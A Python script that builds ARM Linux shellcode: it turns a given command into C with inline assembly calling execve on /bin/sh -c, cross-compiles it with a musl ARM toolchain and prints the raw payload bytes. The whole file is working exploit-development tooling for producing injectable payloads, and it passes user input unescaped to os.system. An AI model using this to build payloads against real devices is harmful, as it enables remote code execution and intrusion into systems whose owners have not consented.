import sys
import os
import time
import tempfile

import subprocess
def format_c_char_array(var_name, string):
    output = []
    length = len(string) + 1  # include null terminator
    output.append(f"char {var_name}[{length}];")
    for i, c in enumerate(string):
        if c == "'":
            c_repr = "\\'"  # escape single quote
        elif c == '\\':
            c_repr = '\\\\'  # escape backslash
        elif c == '\n':
            c_repr = '\\n'
        elif c == '\t':
            c_repr = '\\t'
        else:
            c_repr = c
        output.append(f"{var_name}[{i}] = '{c_repr}';")
    output.append(f"{var_name}[{length - 1}] = '\\0';")
    return "\n".join(output)


def get_shellcode(cmd):

    shecode_c="""
    #include <sys/syscall.h>
    void _start() {"""+f"""
    {format_c_char_array("arg0", "/bin/sh")}
    {format_c_char_array("arg1", "-c")}
    {format_c_char_array("arg2", cmd)}
    """+"""
        char *args[] = {arg0, arg1, arg2, 0};
        __asm__ volatile (
            "mov r7, %0\\n\\t"        
            "mov r0, %1\\n\\t"        
            "mov r1, %2\\n\\t"        
            "mov r2, #0\\n\\t"       
            "svc #0\\n\\t" 
            :
            : "i"(11), "r"(arg0), "r"(args)
            : "r0", "r1", "r2", "r7"
        );

    }
    """
    temp_name =  tempfile.mktemp()
    with open(f"{temp_name}.c","w")as fd:
        fd.write(shecode_c)


    gccpath="."
    # gccpath="/root/musl_packet"
    os.system(f"""{gccpath}/bin/arm-linux-musleabi-gcc -nostdlib -O0 -fno-pic -fno-builtin -o {temp_name} {temp_name}.c""")
    os.system(f"{gccpath}/bin/arm-linux-musleabi-objcopy -O binary {temp_name} {temp_name}.bin")
          

    with open(f"{temp_name}.bin","rb") as fd:
        output=fd.read()
    if len(sys.argv)==3 and sys.argv[1]=="--test":
        print(f"generate File {temp_name} {temp_name}.bin {temp_name}.c")
    else:
        os.system(f"rm {temp_name} {temp_name}.bin {temp_name}.c")
    # returncode, output = subprocess.getstatusoutput(r"""xxd -p ./shellcode.bin | tr -d '\n' | sed 's/\(..\)/\\x\1/g' | sed 's/^/b"/;s/$/"/'""")
    return output
if __name__=="__main__":
    out=get_shellcode(sys.argv[1])
    print(out)
